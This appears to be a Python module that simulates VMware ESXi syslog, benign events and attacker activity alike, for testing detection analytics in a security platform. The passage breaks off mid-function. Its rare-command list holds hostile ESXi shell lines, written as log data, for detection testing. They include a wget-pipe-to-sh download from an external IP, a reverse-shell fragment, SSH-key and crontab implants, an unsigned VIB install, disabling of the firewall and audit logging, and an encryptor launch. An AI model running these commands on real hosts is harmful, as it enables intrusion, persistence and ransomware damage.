# modules/vmware_esxi.py
# Simulates VMware ESXi host syslog for the XSIAM vmware_esxi_raw dataset.
#
# Architecture note:
#   ESXi hosts forward native syslog (vmsyslogd) to a remote collector. In XSIAM the
#   Broker VM Syslog applet is configured Format=Raw, Vendor=VMware, Product=ESXi on a
#   dedicated listening port; the Marketplace "VMware ESXi" content pack supplies the
#   parsing rule (regexcapture -> parsed_fields JSON) and the modeling rule that maps
#   those fields to XDM and the Virtualization Stories.  This is PLAIN SYSLOG, not CEF:
#   there is no __firewall_type-style routing key in the body, so the collector
#   distinguishes ESXi from the other syslog sources BY PORT (its own syslog_port),
#   exactly as cisco_asa (1514), apache (1515) and infoblox (1516) are separated today.
#
# What the pack normalizes (confirmed from the Marketplace pack changelog, not from an
# in-tenant parse here):
#   xdm.source.user.username / xdm.*.identity.*   (auth + identity, pack >= 1.0.8/1.0.20)
#   xdm.source.ipv4                                (client address on auth events)
#   xdm.event.outcome                              (success / failure)
#   target process name / path / command_line      (vmkernel process-lifecycle, >= 1.0.21)
#   virtualization fields + Virtualization Stories  (>= 1.0.10)
#
# Analytics alignment (Cortex "alerts by data source: VMware virtualization servers
# syslogs" — the authoritative list):
#   The data source drives EXACTLY TWO shipped XSIAM analytics, both behavioral-rarity
#   over the COMMAND executed on the host:
#     - "Uncommon command executed on a virtualization host" (ATT&CK T1059.012 Hypervisor
#       CLI) — a command rarely seen on virtualization hosts in the environment.
#     - "Uncommon command was executed on a device" (+ a "...sensitive command..."
#       variation) — the generic device-level form.
#   Both train 30 days, activate after 14, test single-event, dedup 1 day, keyed on the
#   command string and the host. NO auth/identity/VM-lifecycle analytic is published for
#   this data source. Design consequence: the detector is a RARITY model, so it needs a
#   stable COMMON-command baseline (the benign shell_command + crond events) for a RARE
#   command to stand out. The one on-demand analytic threat (uncommon_host_command) fires
#   commands from the rare pool; it is marked analytic but UNVERIFIED in-tenant — every
#   other module in this repo earned "confirmed" only after a live fire -> ingest -> detect
#   pass (_local_validation/threat_harness.py), and this must do the same.
#   The remaining generators (ssh_brute_force, root_login_rare_source, ssh_service_enabled,
#   local_account_created, mass_vm_power_off, remote_syslog_disabled) are faithful ESXi
#   attacker TTPs with no analytic on this data source: background + hunting/correlation,
#   not offered on-demand. Note the account-manipulation / evasion TTPs ALSO surface as
#   uncommon commands when run from the shell — which is the analytic path above.

import random
import time
from datetime import datetime, timezone

try:
    from modules import mgmt_plane
    from modules.azure_common import activity_weight
    from modules.session_utils import (correlated_or_random_user, get_random_user,
                                        random_external_ip, rare_external_ip)
except ImportError:
    import mgmt_plane
    from azure_common import activity_weight
    from session_utils import (correlated_or_random_user, get_random_user,
                               random_external_ip, rare_external_ip)


NAME         = "VMware ESXi"
DESCRIPTION  = "Simulates VMware ESXi host syslog for the XSIAM vmware_esxi_raw dataset."
XSIAM_PARSER = "vmware_esxi_raw"
CONFIG_KEY   = "vmware_esxi_config"

# A real ESXi host is QUIET: outside the ambient vpxa poll it changes state rarely, so
# the default cadence is far below the usual 1/s — ~0.01 events/s (one every 100 s). The
# dashboard reads this (ModuleState -> _module_default_interval); vmware_esxi_config can
# override it with its own `event_interval`. Operators can still dial it up per run.
EVENT_INTERVAL = 100.0

last_threat_event_time = 0

# ── Syslog facilities (RFC 5424 numeric) ──────────────────────────────────────
# hostd/vpxa/vobd/vmkernel log under daemon(3); sshd/pam under authpriv(10). ESXi
# severities map to the standard numbers; the pack reads the severity WORD from the
# body ("info"/"warning"/"error"), so the PRI only needs to be well-formed.
_FAC_DAEMON   = 3
_FAC_AUTHPRIV = 10
_SEV_NUM = {"info": 6, "notice": 5, "warning": 4, "error": 3, "verbose": 7}


# ── Threat catalog (positional metadata, firewall-module style) ───────────────
# analytic=True  -> offered on-demand (dashboard Fire panel / MCP fire_event / CLI),
#                   targets a generic XSIAM analytic that consumes the normalized XDM.
# analytic=False -> background + hunting/correlation only, never offered on-demand.
_THREATS = [
    # The ONE on-demand analytic. VMware virtualization syslogs drive exactly two shipped
    # analytics, both behavioral-rarity over the command executed on the host (see the
    # module docstring). This generator fires commands from the RARE pool; the benign
    # shell_command / crond events supply the COMMON-command baseline they train against.
    {"event": "uncommon_host_command", "weight": 6, "analytic": True,
     "xsiam_alert": "Uncommon command executed on a virtualization host"},
    # Non-analytic: realistic ESXi attacker TTPs with no analytic on this data source.
    # They build baseline, feed hunts, and anchor cross-source correlation/scenario
    # stitching by ESXi host + admin identity. The account-manipulation / evasion ones
    # also show up as uncommon commands when run from the shell (the analytic path above).
    {"event": "ssh_brute_force", "weight": 5, "analytic": False, "xsiam_alert": None},
    {"event": "vuln_scan", "weight": 4, "analytic": False, "xsiam_alert": None},
    {"event": "root_login_rare_source", "weight": 3, "analytic": False, "xsiam_alert": None},
    {"event": "ssh_service_enabled", "weight": 3, "analytic": False, "xsiam_alert": None},
    {"event": "local_account_created", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "mass_vm_power_off", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "remote_syslog_disabled", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "vm_disk_export", "weight": 2, "analytic": False, "xsiam_alert": None},
    # Top-tier custom-rule targets (no shipped analytic; clear log evidence). See the
    # generators and docs/modules/vmware-esxi.md "Custom-rule targets".
    {"event": "guest_ops_exec", "weight": 3, "analytic": False, "xsiam_alert": None},
    {"event": "datastore_upload", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "vm_disk_attach", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "kernel_module_load", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "promiscuous_mode", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "unplanned_reboot", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "snmp_external_target", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "log_rotation_disabled", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "config_harvest", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "permission_denied_burst", "weight": 2, "analytic": False, "xsiam_alert": None},
]

# Commands seen routinely on healthy ESXi hosts — the 30-day training baseline for the
# "uncommon command" analytics. Emitted often (benign shell_command / crond) so a rare
# command stands out. Keep these genuinely mundane (monitoring, inventory, patch checks).
_COMMON_COMMANDS = [
    "/bin/hostd-probe.sh ++group=host/vim/vmvisor/hostd-probe",
    "/bin/esxcli system version get",
    "/bin/esxcli network ip connection list",
    "/bin/vim-cmd hostsvc/hostsummary",
    "/bin/vim-cmd vmsvc/getallvms",
    "/bin/vim-cmd vmsvc/power.getstate",
    "/bin/esxcli storage filesystem list",
    "/bin/esxcli software vib list",
    "/bin/esxcli system syslog config get",
    "/bin/esxtop -b -n 1",
    "/bin/localcli hardware clock get",
    "/sbin/watchdog.sh",
    "/bin/vmware -v",
]

# Uncommon / attacker-interesting commands: interactive shells, account manipulation,
# defense evasion, VIB/signing bypass, encryption & secure-boot downgrade, audit
# tampering, destructive/encryptor staging, downloaded tooling. Rarely (or never) seen on
# a healthy host, so they trip the behavioral-rarity analytics. This set mirrors the
# ESXi-ransomware command catalog SIEM vendors (Splunk/VMware security research) detect on.
# "%s" is filled with a rare external IP at emit time.
_RARE_COMMANDS = [
    "/bin/esxcli system account add -i support -d svc -p ***** -c *****",
    "/bin/esxcli system account remove -i vmadmin",
    "/bin/esxcli system account set -i root -e false",
    "/bin/esxcli system permission set -i support -r Admin",
    "/bin/esxcli system permission unset -i vmadmin",
    "/bin/esxcli network firewall set --enabled false",
    "/bin/esxcli network firewall unload",
    "/bin/vim-cmd hostsvc/lockdown_disable",
    "/bin/esxcli system syslog config set --loghost=''",
    "/bin/esxcli system auditrecords remote disable",
    "/bin/esxcli system auditrecords local disable",
    "/bin/esxcli software acceptance set --level CommunitySupported",
    "/bin/esxcli software vib install -v /tmp/.x/evil.vib --force --no-sig-check",
    "/bin/esxcli system settings encryption set --require-secure-boot=false",
    "/bin/esxcli system settings encryption set --require-exec-installed-only=false",
    "/bin/esxcli system maintenanceMode set -e true",
    "/bin/esxcli system coredump file set --unconfigure",
    "/bin/python -c 'import socket,subprocess,os'",
    "/bin/sh -c 'wget http://%s/x.sh -O- | sh'",
    "/bin/dd if=/dev/zero of=/vmfs/volumes/datastore1/pad bs=1M count=512",
    "/bin/chmod +x /tmp/.hidden/encryptor && /tmp/.hidden/encryptor",
    # Persistence TTPs — SSH key implant and crontab implant (ESXi ransomware staples).
    "/bin/sh -c 'echo ssh-rsa AAAAB3Nza... attacker >> /etc/ssh/keys-root/authorized_keys'",
    "/bin/sh -c 'echo \"* * * * * /tmp/.x/implant\" >> /var/spool/cron/crontabs/root'",
    "/bin/esxcli software vib remove -n esx-tboot",
]


def get_threat_names():
    """Every threat name (analytic or not); long-running sessions emit them all."""
    return [t["event"] for t in _THREATS]


def get_threat_info():
    """Per-threat metadata, same shape the firewall modules expose (event,
    display_name, analytic, xsiam_alert, weight). threat_catalog reads this to build
    the on-demand list — only analytic entries with an xsiam_alert are offered."""
    return [{"event": t["event"], "display_name": t["event"],
             "analytic": t["analytic"], "xsiam_alert": t["xsiam_alert"],
             "weight": t["weight"]}
            for t in _THREATS]


# ── Config access ─────────────────────────────────────────────────────────────

def _conf(config):
    return config.get(CONFIG_KEY, {}) or {}


def _hosts(config):
    """Cluster hostnames. A stable set keeps each ESXi host a real entity for
    host-baselined analytics instead of a stream of one-off names."""
    return _conf(config).get("hosts", ["esxi01.corp.local", "esxi02.corp.local",
                                        "esxi03.corp.local"])


def _admins(config):
    """Local/service ESXi identities. root plus a couple of named operators; the
    human operators correlate to a session_utils user when a session context is
    present so ESXi auth stitches to the same identity seen on cloud/Windows feeds."""
    return _conf(config).get("admins", ["root", "svc_vcenter", "vmadmin"])


def _disabled_accounts(config):
    """Accounts that exist on the host but are disabled (NoAccess / locked). A login
    attempt against one is a distinct signal from an unknown user."""
    return _conf(config).get("disabled_accounts", ["svc_legacy", "auditor"])


def _former_accounts(config):
    """Accounts that were deleted/offboarded. A login attempt against one surfaces as an
    unknown user (SSH 'Invalid user' / console 'no such user')."""
    return _conf(config).get("former_accounts", ["jdoe", "contractor1", "tempadmin"])


def _datastores(config):
    return _conf(config).get("datastores", ["datastore1", "ds-prod-nfs01", "ds-vsan-01"])


def _vms(config):
    return _conf(config).get("vms", ["DC01", "FILE01", "SQL01", "WEB01", "APP01",
                                     "EXCH01", "BACKUP01"])


def _mgmt_ip(config):
    return _conf(config).get("mgmt_ip", "127.0.0.1")


def _vcenter(config):
    """(name, ip) of the managing vCenter. vpxa is present on these hosts, so they ARE
    vCenter-managed; vCenter drives the host through the built-in 'vpxuser' account."""
    c = _conf(config)
    return (c.get("vcenter_name", "vcenter.corp.examplecorp.local"),
            c.get("vcenter_ip", "10.0.20.20"))


def _backup_proxy(config):
    """(ip, account) of the VM backup proxy that snapshots and reads VMs over NFC. The
    legitimate counterpart to the vm_disk_export threat (same NFC file-read mechanism)."""
    c = _conf(config)
    return c.get("backup_proxy_ip", "10.0.20.15"), c.get("backup_account", "svc_vmbackup")


# ── Timestamp / header ─────────────────────────────────────────────────────────

def _ts(dt=None):
    """ISO8601 UTC with millisecond precision and a 'Z' suffix — the format modern
    ESXi (6.5+) emits and the XSIAM pack's parsing rule extracts for _time. A BSD
    'Mmm dd HH:MM:SS' stamp (legacy ESXi 6.0) carries no year/zone and leaves _time
    unset, which breaks every time-windowed analytic — so never emit that here."""
    t = dt or datetime.now(timezone.utc)
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


def _pri(facility, severity_word):
    return facility * 8 + _SEV_NUM.get(severity_word, 6)


def _hostd_line(config, host, severity, sub, body, opid=None, user=None, dt=None):
    """A hostd/vpxa-style line:
      <PRI>TS HOST Proc: sev proc[pid] [Originator@6876 sub=.. opID=.. user=..] body
    This is the shape the pack's regexcapture is written against; the Originator tag
    sits in the message body (not RFC5424 structured data), matching real ESXi."""
    proc = sub.split(".")[0].lower()
    proc = {"vimsvc": "hostd", "vmsvc": "hostd", "vpxlro": "vpxa",
            "hostsvc": "hostd", "default": "hostd"}.get(proc, "hostd")
    pid = random.randint(2000000, 2600000)
    orig = f"[Originator@6876 sub={sub}"
    if opid:
        orig += f" opID={opid}"
    if user:
        orig += f" user={user}"
    orig += "]"
    label = proc.capitalize()
    pri = _pri(_FAC_DAEMON, severity)
    return (f"<{pri}>{_ts(dt)} {host} {label}: {severity} {proc}[{pid}] "
            f"{orig} {body}")


def _sshd_line(config, host, body, dt=None, pam=False):
    """An sshd / pam_unix line (authpriv facility). `pam` may be falsy (plain sshd),
    True / "session" (pam_unix(sshd:session)), or "auth" (pam_unix(sshd:auth))."""
    pid = random.randint(2000000, 2600000)
    pri = _pri(_FAC_AUTHPRIV, "info")
    if pam:
        mod = pam if pam in ("auth", "session", "account") else "session"
        prefix = f"pam_unix(sshd:{mod}): "
    else:
        prefix = ""
    return f"<{pri}>{_ts(dt)} {host} sshd[{pid}]: {prefix}{body}"


def _vobd_line(config, host, vob_id, body, dt=None):
    """A vobd correlator line: vobd: [GenericCorrelator] <us>us: [vob.<id>] <body>"""
    pri = _pri(_FAC_DAEMON, "info")
    micros = random.randint(100000000, 9000000000)
    return (f"<{pri}>{_ts(dt)} {host} vobd: [GenericCorrelator] {micros}us: "
            f"[{vob_id}] {body}")


def _cmd_line(config, host, cmd, dt=None):
    """ESXi shell command execution:  HOST shell[pid]: USER root pid <pid> cmd <cmd>
    The modeling rule (pack >= 1.0.21) extracts target process name / path /
    command_line from this form — the fields the 'uncommon command' analytics key on."""
    pri = _pri(_FAC_DAEMON, "info")
    return (f"<{pri}>{_ts(dt)} {host} shell[{random.randint(2100000, 2600000)}]: "
            f"USER root pid {random.randint(9000000, 9999999)} cmd {cmd}")


def _vmkernel_line(config, host, subsystem, body, severity="info", dt=None):
    """A vmkernel line:  HOST vmkernel: cpuN:worldid)[WARNING: ]<Subsystem>: <body>
    vmkernel carries no Originator tag — it is cpu/world-prefixed kernel text."""
    pri = _pri(_FAC_DAEMON, severity)
    warn = "WARNING: " if severity in ("warning", "error") else ""
    cpu = random.randint(0, 63)
    world = random.randint(2000000, 2600000)
    return (f"<{pri}>{_ts(dt)} {host} vmkernel: cpu{cpu}:{world})"
            f"{warn}{subsystem}: {body}")


def _fdm_line(config, host, body, severity="info", dt=None):
    """An fdm (vSphere HA Fault Domain Manager agent) line."""
    pri = _pri(_FAC_DAEMON, severity)
    pid = random.randint(2000000, 2600000)
    return (f"<{pri}>{_ts(dt)} {host} fdm[{pid}]: [Originator@6876 sub=Cluster] {body}")


def _rhttpproxy_line(config, host, sub, body, severity="verbose", dt=None):
    """An rhttpproxy (reverse-proxy, TCP 443) line — the surface a web/management
    vulnerability scanner hammers first."""
    pri = _pri(_FAC_DAEMON, severity)
    pid = random.randint(2000000, 2600000)
    return (f"<{pri}>{_ts(dt)} {host} Rhttpproxy: {severity} rhttpproxy[{pid}] "
            f"[Originator@6876 sub={sub}] {body}")


def _opid():
    return f"esxui-{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffff):04x}"


def _resolve_admin(config, session_context, external=False):
    """(user, src_ip). Prefer a correlated session_utils identity so ESXi auth stitches
    to the same person seen elsewhere; fall back to a local ESXi account. `external`
    forces a public client IP (for off-net / attacker logons)."""
    if session_context and not external:
        ui = correlated_or_random_user(session_context, preferred_device_type="workstation")
        if ui and ui.get("username"):
            return ui["username"], ui.get("ip") or _mgmt_ip(config)
    user = random.choice(_admins(config))
    if external:
        return user, random_external_ip(config)
    # Remote administration comes from the shared ops-team jump hosts / admin subnet
    # (mgmt_plane) — the same sources the firewall modules use. Console-only generators
    # (DCUI, the syslog-logHost "Set called with key") hardcode loopback themselves.
    return user, mgmt_plane.admin_source(config)


# ── Benign generators ───────────────────────────────────────────────────────────
# Routine day-to-day ESXi operations that build a clean per-host baseline. These are
# separate named helpers (not a wall of if-branches) so the operations the environment
# must always exercise — SSH/ESXi Shell enable+disable, interactive shell logins, VM
# power on/off — are first-class, discoverable, and individually weighted. Each returns
# a syslog string or a list of strings; the dispatcher in log_simulator handles both.

def _b_vpxa_poll(config, host, session_context):
    """The dominant ambient event: vpxa's periodic status poll. High volume, verbose."""
    return _hostd_line(config, host, "verbose", "vpxLro",
                       f"Completed work for request; total requests outstanding: "
                       f"{random.randint(0, 4)}",
                       opid=f"PollQuickStatsLoop-{random.randint(0, 0xffffff):06x}")


def _b_shell_command(config, host, session_context):
    """Common-command baseline the 'uncommon command' analytics train against."""
    return _cmd_line(config, host, random.choice(_COMMON_COMMANDS))


def _b_vsphere_session(config, host, session_context):
    """A vSphere Client / API login or logout (hostd Vimsvc event)."""
    user, src = _resolve_admin(config, session_context)
    ev = random.randint(900000, 999999)
    if random.random() < 0.55:
        client = random.choice(["pyvmomi", "VMware vSphere Client/8.0", "VMware-client/8.0.0"])
        body = f"Event {ev} : User {user}@{src} logged in as {client}"
    else:
        body = (f"Event {ev} : User {user}@{src} logged out "
                f"(login time: {_ts()}, number of API invocations: "
                f"{random.randint(1, 400)}, user agent: pyvmomi)")
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr", body, opid=_opid(), user=user)


def _b_shell_login(config, host, session_context):
    """Interactive logins — SSH, local ESXi Shell, or DCUI console — covering both
    SUCCESS and FAILURE, over the channels and SSH auth methods a real host sees:

      SSH success   Accepted {password|publickey|keyboard-interactive/pam} + pam session
                    opened + hostd/vob "SSH session was opened", and the close sequence.
      SSH failure   Failed {password|keyboard-interactive} / Invalid user + pam auth
                    failure + vob.user.ssh.session.failed  (benign single mistype here;
                    the ssh_brute_force threat is the high-volume version).
      ESXi Shell /  hostd "User <u>@127.0.0.1 logged in/out as ESXi Shell|DCUI" on
      DCUI          success; hostd "Cannot login <u>@127.0.0.1" on failure.
    """
    user, src = _resolve_admin(config, session_context)
    channel = random.choices(["ssh", "esxi_shell", "dcui"], weights=[55, 25, 20], k=1)[0]
    success = random.random() < 0.82     # mostly clean; a minority are failed attempts
    ev = random.randint(900000, 999999)

    if channel == "ssh":
        port = random.randint(30000, 60000)
        if success:
            if random.random() < 0.65:   # session open
                method = random.choice(["password", "publickey", "keyboard-interactive/pam"])
                return [
                    _sshd_line(config, host, f"Accepted {method} for {user} from {src} port {port} ssh2"),
                    _sshd_line(config, host, f"session opened for user {user} by (uid=0)", pam="session"),
                    _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                                f"Event {ev} : SSH session was opened for '{user}@{src}'.",
                                opid=_opid(), user=user),
                    _vobd_line(config, host, "vob.user.esxshell.ssh.session.opened",
                               f"SSH session was opened for '{user}@{src}'."),
                ]
            return [                       # session close
                _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                            f"Event {ev} : SSH session was closed for '{user}@{src}'.",
                            opid=_opid(), user=user),
                _vobd_line(config, host, "vob.user.esxshell.ssh.session.closed",
                           f"SSH session was closed for '{user}@{src}'."),
                _sshd_line(config, host, f"session closed for user {user}", pam="session"),
            ]
        # single failed SSH attempt
        if random.random() < 0.3:
            bad_user = random.choice(["admin", "administrator", "guest", "test"])
            return [
                _sshd_line(config, host, f"Invalid user {bad_user} from {src} port {port}"),
                _sshd_line(config, host,
                           f"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
                           f"rhost={src}", pam="auth"),
            ]
        method = random.choice(["password", "keyboard-interactive/pam"])
        return [
            _sshd_line(config, host, f"Failed {method} for {user} from {src} port {port} ssh2"),
            _sshd_line(config, host,
                       f"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
                       f"rhost={src} user={user}", pam="auth"),
            _vobd_line(config, host, "vob.user.ssh.session.failed",
                       f"SSH login has failed for '{user}@{src}'."),
        ]

    # Local ESXi Shell / DCUI — loopback console.
    client = "ESXi Shell" if channel == "esxi_shell" else "DCUI"
    if success:
        verb = "logged in" if random.random() < 0.7 else "logged out"
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : User {user}@127.0.0.1 {verb} as {client}",
                           opid=_opid(), user=user)
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Cannot login {user}@127.0.0.1 ({client})",
                       opid=_opid(), user=user)


def _b_ssh_service_toggle(config, host, session_context):
    """Routine maintenance: an admin enables or disables SSH or the ESXi Shell. Real
    operators turn SSH on for a task and off afterwards, so BOTH states are normal here
    (the uncommon-command and lateral-movement threats are a separate, actor-driven
    path). hostd config event + the matching vob correlator event."""
    user, src = _resolve_admin(config, session_context)
    svc = random.choice(["SSH", "ESXi Shell"])
    action = random.choice(["enabled", "disabled"])
    base = "vob.user.esxshell.ssh" if svc == "SSH" else "vob.user.esxshell"
    ev = random.randint(900000, 999999)
    return [
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {ev} : {svc} access has been {action} on {host} by {user}@{src}",
                    opid=_opid(), user=user),
        _vobd_line(config, host, f"{base}.{action}", f"{svc} access has been {action}."),
    ]


def _b_vm_power(config, host, session_context):
    """A VM power / guest-OS state change — the routine on/off/suspend/reset/shutdown/
    reboot that happens constantly in any ESX environment."""
    vm = random.choice(_vms(config))
    act = random.choices(
        ["is powered on", "is powered off", "is suspended", "is reset",
         "guest OS shut down", "guest OS reboot", "guest OS standby"],
        weights=[26, 22, 8, 6, 16, 12, 10], k=1)[0]
    ev = random.randint(900000, 999999)
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : {vm} on {host} {act}", opid=_opid())


def _b_vm_lifecycle(config, host, session_context):
    """Day-to-day VM administration beyond power: create, clone, reconfigure, vMotion
    migration, and snapshot removal/consolidation."""
    vm = random.choice(_vms(config))
    ev = random.randint(900000, 999999)
    kind = random.choice(["create", "clone", "reconfigure", "migrate", "remove_snapshot",
                          "consolidate"])
    if kind == "create":
        body = f"Event {ev} : Created virtual machine {vm} on {host}"
    elif kind == "clone":
        body = f"Event {ev} : Cloning {vm} on host {host} to {vm}-clone"
    elif kind == "reconfigure":
        body = f"Event {ev} : Reconfigured {vm} on {host}"
    elif kind == "migrate":
        others = [h for h in _hosts(config) if h != host] or [host]
        dst = random.choice(others)
        body = (f"Event {ev} : Migrating {vm} from {host} to {dst} "
                f"(vMotion) — migration completed")
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr", body, opid=_opid())
    elif kind == "consolidate":
        return _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                           f"Consolidate disks: vm={vm}", opid=_opid())
    else:  # remove_snapshot
        return _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                           f"Remove Snapshot: Backup snapshot vm={vm}", opid=_opid())
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr", body, opid=_opid())


def _b_snapshot(config, host, session_context):
    """Backup-job snapshot creation (quiesced)."""
    vm = random.choice(_vms(config))
    return _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                       f"Create Snapshot: Backup snapshot, memory=false, "
                       f"quiescent=true state=5 vm={vm}", opid=_opid())


def _b_maintenance_mode(config, host, session_context):
    """Host entering / exiting maintenance mode, and the PLANNED reboot that happens
    inside a maintenance window — the baseline the unplanned_reboot threat stands against
    (a reboot with no surrounding maintenance event is the signal)."""
    user, src = _resolve_admin(config, session_context)
    ev = random.randint(900000, 999999)
    choice = random.choices(["enter", "exit", "planned_reboot"], weights=[40, 40, 20], k=1)[0]
    if choice == "planned_reboot":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Host {host} is being rebooted by {user}@{src} "
                           f"(in maintenance mode, no running VMs)", opid=_opid(), user=user)
    state = "has entered maintenance mode" if choice == "enter" else "has exited maintenance mode"
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Host {host} {state}", opid=_opid(), user=user)


def _b_storage(config, host, session_context):
    ds = random.choice(_datastores(config))
    body = random.choice([
        f"Received volume state change event for '{ds}' going online",
        f"Device naa.{random.randint(10**19, 10**20):x} performance has deteriorated. "
        f"I/O latency increased to {random.randint(1500, 4000)} microseconds.",
        f"NFS volume '{ds}' is accessible again",
    ])
    sev = "warning" if "deteriorated" in body else "info"
    return _hostd_line(config, host, sev, "Vmsvc.vm", body, opid=_opid())


def _b_crond(config, host, session_context):
    pri = _pri(_FAC_DAEMON, "info")
    return (f"<{pri}>{_ts()} {host} crond[{random.randint(2100, 2200)}]: "
            f"USER root pid {random.randint(9000000, 9999999)} cmd "
            f"/bin/hostd-probe.sh ++group=host/vim/vmvisor/hostd-probe")


def _b_service_health(config, host, session_context):
    return _hostd_line(config, host, "info", "Hostsvc", random.choice([
        "Current working directory reset to /",
        "VMFS heartbeat succeeded on all datastores",
        f"Health status: green (checked {random.randint(20, 60)} sensors)",
        "NTP time synchronization completed",
    ]), opid=_opid())


def _b_vmkernel(config, host, session_context):
    """Kernel-layer activity: storage path / device, networking NIC link, SCSI sense,
    and hardware-sensor events — the vmkernel.log / vmkwarning.log content."""
    naa = f"naa.{random.randint(10**19, 10**20):x}"
    choice = random.choices(
        ["path_change", "scsi", "apd", "pdl", "nic_link", "sensor", "mem"],
        weights=[22, 18, 6, 4, 20, 15, 15], k=1)[0]
    if choice == "path_change":
        return _vmkernel_line(config, host, "ScsiPath",
                              f"vmhba{random.randint(0,3)}:C0:T{random.randint(0,4)}:L0 "
                              f"changed state from {random.choice(['on','off','standby'])} "
                              f"(device {naa})")
    if choice == "scsi":
        return _vmkernel_line(config, host, "ScsiDeviceIO",
                              f"Cmd(0x{random.randint(0,0xffffff):06x}) 0x2a, CmdSN 0x{random.randint(0,0xffff):x} "
                              f"to dev \"{naa}\" failed H:0x0 D:0x2 P:0x0 Sense Data: 0x5 0x24 0x0",
                              severity=random.choice(["info", "warning"]))
    if choice == "apd":
        return _vmkernel_line(config, host, "WARNING: ScsiDevice",
                              f"Device {naa} has entered the All Paths Down state.",
                              severity="warning")
    if choice == "pdl":
        return _vmkernel_line(config, host, "WARNING: ScsiDevice",
                              f"Device {naa} has been removed or is permanently inaccessible. (PDL)",
                              severity="warning")
    if choice == "nic_link":
        up = random.random() < 0.7
        return _vmkernel_line(config, host, "Uplink",
                              f"vmnic{random.randint(0,5)} link {'up' if up else 'down'} "
                              f"- {random.choice(['1000','10000','25000'])} Mbps, full duplex")
    if choice == "sensor":
        return _vmkernel_line(config, host, "IntrCookie",
                              random.choice([
                                  "Hardware sensor 'Fan 2' state changed to green",
                                  "Hardware sensor 'Power Supply 1' state changed to green",
                                  "Hardware sensor 'System Board Temp' reading nominal",
                              ]))
    return _vmkernel_line(config, host, "MemSched",
                          f"Admission check: host memory {random.randint(40,85)}% committed")


def _b_ha_drs(config, host, session_context):
    """vSphere HA (fdm) and DRS cluster activity — heartbeats, elections, and DRS /
    vMotion load-balancing recommendations."""
    if random.random() < 0.55:
        return _fdm_line(config, host, random.choice([
            "FDM master heartbeat received from all slaves",
            f"Datastore heartbeat healthy on {random.choice(_datastores(config))}",
            "This host has been elected as the HA master",
            "Host isolation address responded; host is not isolated",
        ]))
    vm = random.choice(_vms(config))
    others = [h for h in _hosts(config) if h != host] or [host]
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {random.randint(900000, 999999)} : DRS migrated {vm} "
                       f"from {host} to {random.choice(others)} to balance load",
                       opid=_opid())


def _b_service_control(config, host, session_context):
    """Routine service / daemon control: restarts, certificate refresh, NTP daemon."""
    user, src = _resolve_admin(config, session_context)
    choice = random.choice(["restart", "cert", "ntp", "ruleset"])
    if choice == "restart":
        svc = random.choice(["hostd", "vpxa", "ntpd", "DCUI", "vobd"])
        return _hostd_line(config, host, "info", "Hostsvc",
                           f"Service {svc} restarted (watchdog)", opid=_opid())
    if choice == "cert":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {random.randint(900000, 999999)} : Host SSL certificate "
                           f"was renewed on {host}", opid=_opid(), user=user)
    if choice == "ntp":
        return _vmkernel_line(config, host, "NTPClock",
                              f"synchronized to time server {random.choice(['time.google.com','pool.ntp.org'])}")
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {random.randint(900000, 999999)} : Firewall ruleset "
                       f"{random.choice(['ntpClient','sshServer','CIMHttpsServer'])} "
                       f"{random.choice(['enabled','refreshed'])} on {host}",
                       opid=_opid(), user=user)


def _b_account_admin(config, host, session_context):
    """Routine, benign local-account lifecycle and permission administration — the full
    create / disable / delete / password / role / lockout / review set an estate shows
    during onboarding, offboarding, and account hygiene. (The malicious create is the
    local_account_created threat; attacker-driven disable/delete go through the shell as
    uncommon commands.)"""
    actor, src = _resolve_admin(config, session_context)
    target = random.choice(_admins(config) + ["operator", "monitoring", "backupsvc",
                                              "contractor1", "auditor"])
    ev = random.randint(900000, 999999)
    action = random.choices(
        ["password", "role_assign", "role_remove", "create", "disable", "delete",
         "lockout", "review"],
        weights=[20, 14, 10, 14, 10, 8, 10, 14], k=1)[0]

    if action == "create":
        return [
            _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {ev} : Account {target} was created on host {host}",
                        opid=_opid(), user=actor),
            _vobd_line(config, host, "vob.user.account.created",
                       f"Account {target} was created on the host."),
        ]
    if action == "delete":
        return [
            _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {ev} : Account {target} was removed from host {host}",
                        opid=_opid(), user=actor),
            _vobd_line(config, host, "vob.user.account.removed",
                       f"Account {target} was removed from the host."),
        ]
    if action == "disable":
        # ESXi local accounts are "disabled" by revoking access — the NoAccess role.
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
